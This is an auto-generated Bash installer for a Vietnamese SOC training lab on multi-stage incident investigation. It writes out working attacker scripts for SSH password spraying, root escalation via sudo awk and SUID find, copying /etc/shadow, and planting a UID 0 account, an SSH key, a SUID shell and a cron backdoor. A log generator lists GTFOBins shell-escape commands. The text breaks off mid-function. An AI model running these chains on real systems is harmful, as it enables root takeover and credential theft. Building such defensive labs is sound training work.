#!/bin/bash
# ============================================================================
# soc-privesc - Bai 17: Dieu tra su co da giai doan + bao cao IR (7 giai doan, siem anh chung)
# Chay tren VM:  bash install-soc-privesc.sh ; roi rebuild soc-privesc
# (File sinh tu dong boi labs/_shared/make-install.py - sua ma nguon trong labs/soc-privesc/ roi sinh lai.)
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-privesc
echo ">> Tao thu muc lab tai $LAB"; rm -rf "$LAB"; mkdir -p "$LAB"
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/attack.sh" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# =====================================================================================
# Ke tan cong (Bai 17) - chuoi 7 GIAI DOAN, moi giai doan cach nhau >= 2' de dung TIMELINE:
#   (0) SPRAY       : do 1 mat khau pho bien len NSPRAY tai khoan, RAI CHAM (25-35s/lan) -> ne luat
#                     brute-force mac dinh (dem theo IP trong cua so ngan). Lan cuoi = tai khoan bi chiem.
#   (1) ACCESS      : dang nhap tai khoan bi chiem (chinh lan thu cuoi cua dot do)          [GOC]
#   (2) DISCOVERY   : liet ke quyen sudo (sudo -l -> COMMAND=list), tim file SUID
#   (3) ESCALATION  : len root qua sudo awk (chung minh ca SUID find)                        [GOC]
#   (4) CRED ACCESS : chep /etc/shadow ra file an trong /tmp (FIM thay); ghi GT CRED_*
#   (5) PERSISTENCE : plant.sh - UID 0, SSH key (THAT), SUID an, cronjob                     [GOC]
#   (6) RE-ENTRY    : dang nhap ROOT bang SSH key vua cai, keo ban chep shadow ve; bao READY
# Ten ca nhan hoa: EMPNUM, NSPRAY (parameter.config).
# Phat trien nhanh: tao file /home/ubuntu/.fast -> moi khoang cho chia 4 (XOA truoc khi phat hanh).
# =====================================================================================
TARGET=target
VICTIM=empEMPNUM;  VPW=Password123
BDUSER=svc-EMPNUM
NSP=NSPRAY
DIV=1; [ -f /home/ubuntu/.fast ] && DIV=4
nap() { sleep $(( $1 / DIV )); }
OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
-o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1"
KOPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
-o PreferredAuthentications=publickey -o IdentitiesOnly=yes -o PasswordAuthentication=no -i /home/ubuntu/.ssh/bk"
run_v() { sshpass -p "$VPW" ssh $OPTS "$VICTIM@$TARGET" "$1" 2>/dev/null; }
as_root() {  # chay 1 script voi quyen root tren target qua sudo awk (cung co che leo quyen goc)
  local f=/tmp/.u$RANDOM
  sshpass -p "$VPW" scp $OPTS "$1" "$VICTIM@$TARGET:$f" 2>/dev/null
  run_v "sudo -n awk 'BEGIN{system(\"bash $f 2>/dev/null; rm -f $f\")}'"
}
decoy_list() {   # CUNG cong thuc voi target/_bin/fixlocal.sh
  local n=$1 k=1 got=0 name
  while [ "$got" -lt "$n" ]; do
    name=$(printf 'emp%04d' $(( (EMPNUM + k*37) % 9000 + 1000 )))
    k=$((k+1))
    [ "$name" = "$VICTIM" ] && continue
    echo "$name"; got=$((got+1))
  done
}
log() { echo "$(date +%H:%M:%S) $*"; }

# KHONG mo cong 22 de "thu" sshd: ket noi rong sinh dong "Bad protocol version identification ''
# from 172.20.0.5" trong auth.log -> lam nhieu moc TIME_SPRAY. Cong doan cho siem ben duoi (vai phut)
# du de target + sshd san sang.
# KHONG "tham do" bang tai khoan gia: moi lan dang nhap that bai tu .5 se lam lech moc TIME_SPRAY.
# Cho siem SEED XONG (seed restart manager -> su kien luc do bi mat). Tin hieu: user API soc-tool
# (seed tao o CUOI, sau restart) dang nhap duoc. Toi da 20 phut roi chay tiep du sao.
# (Ha tang lab, khong thuoc kich ban: sinh vien khong vao duoc attacker.)
for i in $(seq 1 120); do
  curl -sk -m 5 -u 'soc-tool:Soc.Tool.2026!' -X POST \
    https://172.20.0.20:55000/security/user/authenticate 2>/dev/null | grep -q '"token"' && break
  sleep 10
done
log "siem san sang sau $((i*10))s"
nap 120      # agent target ket noi lai manager sau restart

# ===== (0) PASSWORD SPRAY - rai cham, moi tai khoan DUNG 1 lan, tai khoan bi chiem o CUOI =====
log "stage0 spray NSP=$NSP"
for u in $(decoy_list $((NSP - 1))); do
  sshpass -p "$VPW" ssh $OPTS "$u@$TARGET" true 2>/dev/null
  sleep $(( (25 + RANDOM % 11) / DIV ))
done
# ===== (1) INITIAL ACCESS = lan thu cuoi cua dot do (thanh cong) -> moc TIME_ACCESS =====
log "stage1 access"
until run_v "id >/dev/null 2>&1"; do sleep 5; done

nap 120
# ===== (2) DISCOVERY: liet ke quyen sudo + tim SUID -> moc TIME_DISCOVERY =====
log "stage2 discovery"
run_v "sudo -n -l >/dev/null 2>&1; find / -perm -4000 -type f 2>/dev/null >/dev/null"

nap 120
# ===== (3) PRIVILEGE ESCALATION (goc): sudo awk -> moc TIME_ESCALATION =====
log "stage3 escalation"
for i in $(seq 1 12); do
  run_v "sudo -n awk 'BEGIN{system(\"id > /tmp/.rootproof 2>/dev/null; chmod 644 /tmp/.rootproof 2>/dev/null; echo escalated_via_sudo_awk >> /root/.breach 2>/dev/null\")}'"
  run_v "test -s /tmp/.rootproof" && break
  sleep 10
done
run_v "find /etc/hostname -exec /bin/bash -p -c 'echo also_escalated_via_suid_find >> /root/.breach' \;"

nap 120
# ===== (4) CREDENTIAL ACCESS: chep /etc/shadow ra file an trong /tmp -> moc TIME_CRED =====
log "stage4 cred"
CF="/tmp/.$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)-cache"
cat > /tmp/s4.sh <<S4
cp /etc/shadow $CF && chmod 644 $CF
printf 'CRED_FILE=%s\nCRED_TIME=%s\n' '$CF' "\$(date +%H:%M)" >> /root/.soc_truth
S4
for i in $(seq 1 10); do
  as_root /tmp/s4.sh
  run_v "test -s $CF" && break
  sleep 10
done
rm -f /tmp/s4.sh

nap 120
# ===== (5) PERSISTENCE (goc): plant.sh - nhieu lop, retry den khi backdoor ton tai -> moc TIME_PERSIST =====
log "stage5 persist"
for i in $(seq 1 15); do
  sshpass -p "$VPW" scp $OPTS /home/ubuntu/plant.sh "$VICTIM@$TARGET:/tmp/plant.sh" 2>/dev/null
  run_v "sudo -n awk 'BEGIN{system(\"bash /tmp/plant.sh 2>/dev/null\")}'"
  run_v "id $BDUSER >/dev/null 2>&1" && break
  sleep 20
done

nap 120
# ===== (6) RE-ENTRY: dang nhap ROOT bang SSH key da cai, keo ban chep shadow ve -> moc TIME_REENTRY =====
log "stage6 reentry"
for i in $(seq 1 15); do
  ssh $KOPTS "root@$TARGET" "cat $CF" > /home/ubuntu/loot-shadow.txt 2>/dev/null && [ -s /home/ubuntu/loot-shadow.txt ] && break
  sleep 15
done
# Bao hieu BAT DAU CA TRUC cho sinh vien (doc duoc boi moi user)
ssh $KOPTS "root@$TARGET" "echo 'READY - su co da xay ra, ca truc bat dau' > /var/run/soc-ca-truc; chmod 644 /var/run/soc-ca-truc" 2>/dev/null
touch /home/ubuntu/.chain_done
log "chain done"

# Cronjob doc (plant.sh) tu chay moi 2' = tin hieu dinh ky. Giu container song.
while true; do sleep 3600; done
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/plant.sh" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# Chay voi quyen ROOT (duoc goi qua sudo awk trong phien leo quyen dau tien).
# Cai NHIEU LOP persistence du thua - dung kich ban attacker sau khi chiem root.
BDUSER=svc-EMPNUM
BDPW=S3rv1ce_2026
BK_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA9dB2bZd8K2hXc9jF3kLmN0pQrStUvWxYz1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPbackdoorKEY backdoor@attacker"

# (1) Tai khoan backdoor UID 0
/usr/sbin/useradd -o -u 0 -g 0 -M -d /root -s /bin/bash "$BDUSER" 2>/dev/null
echo "$BDUSER:$BDPW" | /usr/sbin/chpasswd 2>/dev/null

# (2) SSH key backdoor trong /root/.ssh -> quay lai bang KEY (prohibit-password van cho key)
mkdir -p /root/.ssh; chmod 700 /root/.ssh
grep -q 'backdoor@attacker' /root/.ssh/authorized_keys 2>/dev/null || echo "$BK_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# (3) SUID backdoor an (ban sao bash co bit SUID root)
cp /bin/bash /usr/local/bin/.dbus-cache 2>/dev/null
chmod 4755 /usr/local/bin/.dbus-cache 2>/dev/null

# (4) Cronjob doc - beacon dinh ky (tin hieu "ke tan cong con hoat dong")
printf '%s\n' '*/2 * * * * root /bin/bash -c "id >> /tmp/.cronbeacon 2>/dev/null"' > /etc/cron.d/sysbackup
chmod 644 /etc/cron.d/sysbackup

echo "escalated_via_sudo_awk_then_planted_persistence_$BDUSER" >> /root/.breach
rm -f /tmp/plant.sh 2>/dev/null
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an).
# Bai 17: sinh CAP KHOA SSH THAT cho persistence (giai doan 5 cai, giai doan 6 dung de quay lai).
# plant.sh goc chua 1 chuoi khoa gia -> thay dong BK_KEY bang khoa cong khai vua sinh
# (giu comment 'backdoor@attacker' de prestop goc van nhan ra). Logic plant.sh KHONG doi.
mkdir -p /home/ubuntu/.ssh && chmod 700 /home/ubuntu/.ssh
[ -f /home/ubuntu/.ssh/bk ] || ssh-keygen -q -t ed25519 -N '' -C 'backdoor@attacker' -f /home/ubuntu/.ssh/bk
PUB=$(cat /home/ubuntu/.ssh/bk.pub)
sed -i "s|^BK_KEY=.*|BK_KEY=\"$PUB\"|" /home/ubuntu/plant.sh
# Khoi dong chuoi tan cong ngam (1 lan; stop/start lab khong chay lai neu da xong)
if [ ! -f /home/ubuntu/.chain_done ]; then
  setsid bash /home/ubuntu/attack.sh >/home/ubuntu/attack.log 2>&1 < /dev/null &
fi
exit 0
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_LAB_SOC_PRIVESC__'
SOC Lab - Bai 17: Dieu tra su co da giai doan & bao cao IR (Incident Response).
May chu SSH target bi chiem quyen root qua chuoi 7 giai doan (do mat khau rai cham -> truy cap
-> trinh sat -> leo quyen -> chep /etc/shadow -> cai persistence -> quay lai bang SSH key).
Wazuh chi thay 1 canh bao. Nhiem vu: dung timeline toan canh, cach ly, go sach, lap ban do
phu phat hien, viet 3 luat lap lo hong, hardening chu dong va viet bao cao IR.
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_LAB_SOC_PRIVESC__'
# parameter.config - ca nhan hoa chong chep (A1)
# EMPNUM: so ngau nhien 1000-9999, dung cho CA target lan attacker (cung mot gia tri):
#  - tai khoan bi chiem  = emp<EMPNUM>
#  - tai khoan backdoor  = svc-<EMPNUM>
# => moi sinh vien phai TU tim ra ten tai khoan cua minh de dieu tra + go bo (khong chep duoc).
EMPNUM : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:attack.sh;attacker:plant.sh : EMPNUM : 1000 : 9999
# --- Bai 17 (mo rong) ---
# NSPRAY: so tai khoan bi do trong dot do mat khau (tinh ca tai khoan bi chiem) - target + attacker
NSPRAY : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:attack.sh : NSPRAY : 10 : 14
# HVAR: H1 - trinh thong dich mang cap_setuid (1 = python3, 2 = perl)
HVAR : RAND_REPLACE : target:.local/bin/fixlocal.sh : HVAR : 1 : 2
# EDVAR: H2 - chuong trinh trong dong sudo nguy hiem cua deploy (1 = vim, 2 = nano, 3 = less)
EDVAR : RAND_REPLACE : target:.local/bin/fixlocal.sh : EDVAR : 1 : 3
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_LAB_SOC_PRIVESC__'
# start.config - Lab soc-privesc (Bai 17: Dieu tra su co da giai doan + bao cao IR)
# Ban mo rong: chuoi 7 giai doan, siem dung anh chung soc-wazuh + TERMINALS 0 (an, chua dap an moi).
# target co 2 lo hong privesc (SUID find + sudo NOPASSWD awk). Tai khoan emp<EMPNUM> bi chiem.
# attacker (an) dung foothold emp<EMPNUM> de leo len root. Hoc vien san vet qua SIEM roi va ca 2.

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-privesc_student_master_seed
	GRADE_CONTAINER target

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan: co 2 lo hong leo quyen, noi hoc vien dieu tra + va ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 1

# --- Ke tan cong: dung foothold emp<EMPNUM> leo quyen root, chay ngam ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: Wazuh (anh chung soc-wazuh). AN voi sinh vien: chua tap kiem tra an + dap an ban do phu ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST defender:172.20.0.30
	TERMINALS 0

# --- DEFENDER: tram analyst - Firefox (dashboard), SSH sang target, kiem-thu-luat / thu-dong / goi-y ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/fixlocal.sh" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# Chay LAN DAU tren defender (quyen ubuntu). $1 = mat khau sudo.
# Bai 17: cai bo cong cu dung chung (kiem-thu-luat, thu-dong, goi-y), sinh TAP PHAT TRIEN,
# tao khung bai lam + tai lieu tham khao.
PW="$1"
H=/home/ubuntu
S() { echo "$PW" | sudo -S "$@"; }

# ---- 1) Cong cu dung chung ----
S mkdir -p /usr/local/lib/soc-tools /etc/soc-tools /usr/local/share/goi-y
S install -m 644 $H/soc-tools/wzapi.py $H/soc-tools/replay.py /usr/local/lib/soc-tools/
for t in kiem-thu-luat thu-dong goi-y; do S install -m 755 $H/soc-tools/$t /usr/local/bin/$t; done
S install -m 644 $H/bai17/goiy-bai17.dat /usr/local/share/goi-y/bai17.dat
# (khong dung S ... <<heredoc: S da noi mat khau vao stdin cua sudo -> heredoc bi bo, file rong)
cat > /tmp/lab.json <<'JSON'
{
  "rules_file": "luat/local_rules.xml",
  "lists_dir": "luat/lists",
  "lists": ["gtfo-shell", "sudo-approved", "admin-hosts"],
  "dev_set": "dev/dev.jsonl",
  "ranges": "l1=100270-100279,l2=100280-100289,l3=100290-100299",
  "goiy": "bai17"
}
JSON
S install -m 644 /tmp/lab.json /etc/soc-tools/lab.json && rm -f /tmp/lab.json
rm -rf $H/soc-tools

# ---- 2) Tap phat trien co nhan (tu random, doc lap voi tap kiem tra an tren siem) ----
mkdir -p $H/dev
[ -s $H/dev/dev.jsonl ] || python3 $H/bai17/gen17.py --set dev --out $H/dev/dev.jsonl >/dev/null 2>&1
rm -f $H/bai17/gen17.py $H/bai17/goiy-bai17.dat

# ---- 3) Tai lieu tham khao ----
mkdir -p $H/tai-lieu
mv $H/bai17/gtfobins-sudo.txt $H/tai-lieu/ 2>/dev/null
mv $H/bai17/sudo-da-duyet.csv $H/bai17/admin-hosts.csv $H/ 2>/dev/null
rmdir $H/bai17 2>/dev/null

# ---- 4) Khung luat + CDB list ----
mkdir -p $H/luat/lists
[ -f $H/luat/local_rules.xml ] || cat > $H/luat/local_rules.xml <<'XML'
<!--
  BAI 17 - LUAT LAP LO HONG PHAT HIEN (bai lam). Chi dung dung dai ID duoc giao:
    L1 do mat khau rai cham ............ 100270-100279
    L2 sudo toi chuong trinh thoat shell 100280-100289
    L3 root dang nhap tu xa ............ 100290-100299
  Moi luat level >= 10 phai co <mitre>. Kiem thu + nap:  kiem-thu-luat
  Thu 1 dong log:  thu-dong "<dong log>"
-->
<group name="bai17,">

</group>
XML
for l in gtfo-shell sudo-approved admin-hosts; do [ -f $H/luat/lists/$l ] || : > $H/luat/lists/$l; done
[ -f $H/luat/lists/DOC-TRUOC.txt ] || cat > $H/luat/lists/DOC-TRUOC.txt <<'T'
CDB list cua Wazuh: moi dong 1 khoa, ket thuc bang dau hai cham (co the kem gia tri sau dau :).
  vd gtfo-shell :  /usr/bin/awk:
  vd admin-hosts:  172.20.0.41:
KHONG dung dong chu thich (#) trong file list. kiem-thu-luat nap 3 file:
  gtfo-shell, sudo-approved, admin-hosts  (file nay KHONG duoc nap).
T

# ---- 5) Khung bai lam ----
[ -f $H/du-doan.txt ] || cat > $H/du-doan.txt <<'T'
# DU DOAN TRUOC KHI DIEU TRA (khong cham dung sai)
SO_GIAI_DOAN=
SO_CANH_BAO=
T
[ -f $H/khao-sat.txt ] || cat > $H/khao-sat.txt <<'T'
# KHAO SAT TU TIN (1 = rat khong tu tin ... 5 = rat tu tin). Dien TRUOC luc dau bai va SAU luc ket thuc.
# B: "Toi tu tin dung lai toan bo chuoi tan cong tren mot may, tu truoc toi sau canh bao dau tien."
# C: "Toi tu tin tim va dong cac duong leo quyen/duy tri ma ke tan cong chua dung."
TRUOC_B=
TRUOC_C=
SAU_B=
SAU_C=
T
[ -f $H/hardening.txt ] || cat > $H/hardening.txt <<'T'
# HARDENING - moi thay doi 1 dong:  diem yeu | vi sao nguy hiem | da lam gi | kiem chung the nao
T
[ -f $H/bao-cao-ir.md ] || cat > $H/bao-cao-ir.md <<'T'
# BAO CAO SU CO (khung rut gon NIST SP 800-61)

## 1. Tom tat cho ban giam doc (5 cau, khong thuat ngu)

## 2. Timeline (gio | giai doan | bang chung | MITRE)

## 3. Pham vi & tac dong (du lieu nao bi lay, tai khoan nao bi anh huong)

## 4. Nguyen nhan goc

## 5. Hanh dong da lam (cach ly - go bo - hardening - luat moi)

## 6. Bai hoc & khuyen nghi (ky thuat + quy trinh)
T
[ -f $H/phan-tu.txt ] || cat > $H/phan-tu.txt <<'T'
# PHAN TU: so du-doan.txt voi timeline va ban do phu that. Dieu gi lam ban bat ngo nhat?
T
date +%s > $H/.bai17_start
exit 0
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/prestop" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# prestop defender (Bai 17): in so lieu do an (du doan, khao sat, nhat ky goi y / kiem-thu-luat).
# Bao cao IR, hardening, phan tu: GV doc ban goc khi cham tay (o day chi in kich thuoc).
trap "echo Timed out; exit" SIGTERM
ls -t /home/ubuntu/.local/result/prestop.stdout.* 2>/dev/null | tail -n +2 | xargs -r rm -f 2>/dev/null
H=/home/ubuntu
echo "DEFENDER17_MARKER"
echo "START_EPOCH=$(cat $H/.bai17_start 2>/dev/null) NOW_EPOCH=$(date +%s)"
echo "=== du-doan ==="; grep -E '^[A-Z_]+=' $H/du-doan.txt 2>/dev/null
echo "=== khao-sat ==="; grep -E '^[A-Z_]+=' $H/khao-sat.txt 2>/dev/null
echo "=== goi-y ==="; cat $H/.goi-y.log 2>/dev/null; echo "HINT_COUNT=$(cat $H/.goi-y.log 2>/dev/null | wc -l)"
echo "=== kiem-thu-luat ==="; cat $H/.kiem-thu.log 2>/dev/null; echo "KT_COUNT=$(cat $H/.kiem-thu.log 2>/dev/null | wc -l)"
for f in hardening.txt bao-cao-ir.md phan-tu.txt; do
  echo "FILE $f LINES=$(grep -cvE '^\s*(#|$)' $H/$f 2>/dev/null)"
done
exit 0
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/bai17"
cat > "$LAB/defender/bai17/admin-hosts.csv" <<'__EOF_LAB_SOC_PRIVESC__'
ip,hostname,status,ghi_chu
172.20.0.41,adm-01,approved,May chu quan tri chinh (bastion)
172.20.0.42,adm-02,approved,May chu quan tri du phong
172.20.0.49,adm-old,retired,Ngung su dung tu thang 9 - cho thanh ly
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/bai17"
cat > "$LAB/defender/bai17/gen17.py" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# gen17.py - bo sinh kich ban log cho 3 luat lap lo hong cua Bai 17 (dinh dang JSONL cua replay.py).
#   l1 = do mat khau rai cham (L1, dai 100270-100279)
#   l2 = sudo toi chuong trinh thoat duoc shell (L2, dai 100280-100289)
#   l3 = root dang nhap tu xa tu may khong duoc duyet (L3, dai 100290-100299)
# Dung chung cho siem (tap kiem tra AN) va defender (tap phat trien). Hai noi tu random doc lap.
#
#   gen17.py --set dev|hidden --out FILE [--seed N]     sinh tap
#   gen17.py --check FILE                                kiem bat bien (unit test)
# ============================================================================
import argparse, json, random, sys
from datetime import datetime, timedelta

HOST = "target"
ADMIN_APPROVED = ["172.20.0.41", "172.20.0.42"]     # khop admin-hosts.csv (status=approved)
ADMIN_RETIRED = ["172.20.0.49"]                     # khop admin-hosts.csv (status=retired)
APPROVED_SUDO = [                                   # khop sudo-da-duyet.csv
    ("deploy", "/usr/bin/systemctl restart nginx"),
    ("deploy", "/usr/bin/systemctl restart cron"),
    ("adminops", "/usr/bin/apt update"),
    ("adminops", "/usr/bin/tail -n 200 /var/log/syslog"),
]
GTFO_DEV = ["/usr/bin/awk", "/usr/bin/vim", "/usr/bin/find", "/usr/bin/nano"]
GTFO_HIDDEN_EXTRA = ["/usr/bin/less", "/usr/bin/vi", "/usr/bin/perl", "/usr/bin/python3", "/usr/bin/env"]
EDITORS = ["/usr/bin/vim", "/usr/bin/nano", "/usr/bin/less", "/usr/bin/vi"]
GTFO_CMD = {
    "/usr/bin/awk": "/usr/bin/awk BEGIN {system(\"/bin/sh\")}",
    "/usr/bin/find": "/usr/bin/find . -exec /bin/sh ; -quit",
    "/usr/bin/vim": "/usr/bin/vim -c :!/bin/sh",
    "/usr/bin/vi": "/usr/bin/vi /etc/hosts",
    "/usr/bin/nano": "/usr/bin/nano /etc/hosts",
    "/usr/bin/less": "/usr/bin/less /var/log/syslog",
    "/usr/bin/perl": "/usr/bin/perl -e exec \"/bin/sh\";",
    "/usr/bin/python3": "/usr/bin/python3 -c import os; os.system(\"/bin/sh\")",
    "/usr/bin/env": "/usr/bin/env /bin/sh",
}

R = random.Random()
_BASE = [datetime(2026, 11, 20, 9, 0, 0)]


def ts(t):
    # dinh dang syslog: "Nov  5 09:00:01" (ngay can le 2 ky tu)
    return "%s %2d %s" % (t.strftime("%b"), t.day, t.strftime("%H:%M:%S"))


def pid():
    return R.randint(1200, 65000)


def port():
    return R.randint(32768, 60999)


def emp():
    return "emp%04d" % R.randint(1000, 9999)


def emps(n):
    s = set()
    while len(s) < n:
        s.add(emp())
    return list(s)


def ip_internal():
    return "172.20.0.%d" % R.choice(list(range(50, 99)))


def ip_external():
    return "%d.%d.%d.%d" % (R.choice([45, 91, 103, 185, 203]), R.randint(1, 254), R.randint(1, 254), R.randint(1, 254))


def fp_key():
    abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(R.choice(abc) for _ in range(43))


def l_fail(t, user, ip):
    return "%s %s sshd[%d]: Failed password for %s from %s port %d ssh2" % (ts(t), HOST, pid(), user, ip, port())


def l_ok_pw(t, user, ip):
    return "%s %s sshd[%d]: Accepted password for %s from %s port %d ssh2" % (ts(t), HOST, pid(), user, ip, port())


def l_ok_key(t, user, ip):
    return "%s %s sshd[%d]: Accepted publickey for %s from %s port %d ssh2: ED25519 SHA256:%s" % (
        ts(t), HOST, pid(), user, ip, port(), fp_key())


def l_sudo(t, user, cmd):
    return "%s %s sudo: %8s : TTY=pts/%d ; PWD=/home/%s ; USER=root ; COMMAND=%s" % (
        ts(t), HOST, user, R.randint(0, 4), user, cmd)


def start():
    _BASE[0] += timedelta(hours=1, minutes=R.randint(0, 50))
    return _BASE[0]


# ------------------------------------------------------------------ L1
def l1_mal(variant):
    t, ip = start(), (ip_internal() if R.random() < 0.6 else ip_external())
    if variant == "fast":
        n, gaps = R.randint(9, 12), (8, 15)
    else:
        n, gaps = R.randint(8, 13), (25, 44)
    users = emps(n)
    lines = []
    for u in users:
        lines.append(l_fail(t, u, ip))
        t += timedelta(seconds=R.randint(*gaps))
    if variant == "success":
        lines[-1] = l_ok_pw(t, users[-1], ip)
    return lines, 600


def l1_benign(variant):
    t = start()
    lines = []
    if variant == "typo":                       # 1 nguoi go nham 1-4 lan roi vao duoc
        u, ip = emp(), ip_internal()
        for _ in range(R.randint(1, 4)):
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(3, 20))
        lines.append(l_ok_pw(t, u, ip))
    elif variant == "jumphost":                 # may chu nhay dung chung: <=3 user go nham roi rac
        ip = ip_internal()
        for u in emps(R.randint(2, 3)):
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(5, 30))
            lines.append(l_ok_pw(t, u, ip)); t += timedelta(seconds=R.randint(60, 180))
        for u in emps(R.randint(2, 4)):
            lines.append(l_ok_pw(t, u, ip)); t += timedelta(seconds=R.randint(20, 90))
    elif variant == "distributed":              # nhieu nguoi go nham, MOI NGUOI 1 IP khac nhau
        for u in emps(R.randint(6, 9)):
            ip = ip_internal()
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(10, 60))
            lines.append(l_ok_pw(t, u, ip)); t += timedelta(seconds=R.randint(5, 30))
    elif variant == "stale":                    # tac vu tu dong dung mat khau CU: 1 user, 6-8 lan, cung IP
        u, ip = R.choice(["svc-backup", "svc-report", "svc-monitor"]), ip_internal()
        for _ in range(R.randint(6, 8)):
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(50, 90))
    else:                                       # "repeat": 1 user quen mat khau, thu 5-7 lan, khong vao duoc
        u, ip = emp(), ip_internal()
        for _ in range(R.randint(5, 7)):
            lines.append(l_fail(t, u, ip)); t += timedelta(seconds=R.randint(20, 90))
    return lines, 600


# ------------------------------------------------------------------ L2
def l2_mal(prog, user):
    t = start()
    lines = []
    if R.random() < 0.5:
        lines.append(l_sudo(t, user, "list")); t += timedelta(seconds=R.randint(10, 60))
    lines.append(l_sudo(t, user, GTFO_CMD[prog]))
    return lines, 120


def l2_benign(variant):
    t = start()
    if variant == "approved":
        pairs = R.sample(APPROVED_SUDO, R.randint(1, 3))
        lines = []
        for u, c in pairs:
            lines.append(l_sudo(t, u, c)); t += timedelta(seconds=R.randint(5, 50))
        return lines, 120
    if variant == "list":
        return [l_sudo(t, emp(), "list")], 120
    if variant == "deploy-approved-repeat":
        u, c = APPROVED_SUDO[R.randint(0, 1)]
        return [l_sudo(t, u, c), l_sudo(t + timedelta(seconds=40), u, c)], 120
    return [l_sudo(t, "adminops", R.choice(["/usr/bin/apt update", "/usr/bin/tail -n 200 /var/log/syslog"]))], 120


# ------------------------------------------------------------------ L3
def l3_mal(variant):
    t = start()
    if variant == "internal-key":
        return [l_ok_key(t, "root", ip_internal())], 120
    if variant == "external-key":
        return [l_ok_key(t, "root", ip_external())], 120
    if variant == "password":
        ip = ip_internal()
        return [l_fail(t, "root", ip), l_ok_pw(t + timedelta(seconds=7), "root", ip)], 120
    return [l_ok_key(t, "root", R.choice(ADMIN_RETIRED))], 120          # "retired-admin"


def l3_benign(variant):
    t = start()
    if variant == "admin":
        return [l_ok_key(t, "root", R.choice(ADMIN_APPROVED))], 120
    if variant == "user-key":
        return [l_ok_key(t, emp(), ip_internal())], 120
    if variant == "deploy-key":
        return [l_ok_key(t, "deploy", R.choice(ADMIN_APPROVED + [ip_internal()]))], 120
    if variant == "root-fail":
        return [l_fail(t, "root", ip_external())], 120
    return [l_ok_pw(t, emp(), ip_internal())], 120                      # "user-pw"


# ------------------------------------------------------------------ lap tap
def build(kind):
    out = []

    def add(fam, label, variant, pair):
        lines, w = pair
        out.append({"id": "%s-%s-%02d" % (fam, "m" if label == "mal" else "b", 1 + sum(
            1 for s in out if s["family"] == fam and s["label"] == label)),
            "family": fam, "label": label, "variant": variant, "window_s": w, "lines": lines})

    # L1
    mal1 = ["slow", "success", "slow"] + (["fast"] if kind == "hidden" else [])
    for v in mal1:
        add("l1", "mal", v, l1_mal(v))
    # lanh: moi bien the bay 1 kieu luat sai (dem lan that bai thay vi dem TAI KHOAN; khong gom theo IP)
    ben1 = ["typo", "stale", "jumphost", "distributed", "distributed", "repeat"]
    for v in ben1:
        add("l1", "benign", v, l1_benign(v))

    # L2: tap an co them chuong trinh chua gap trong tap phat trien (~1/3 bien the moi)
    if kind == "dev":
        mal2 = [("/usr/bin/awk", emp()), ("/usr/bin/vim", emp()), (R.choice(["/usr/bin/nano", "/usr/bin/vim"]), "deploy")]
    else:
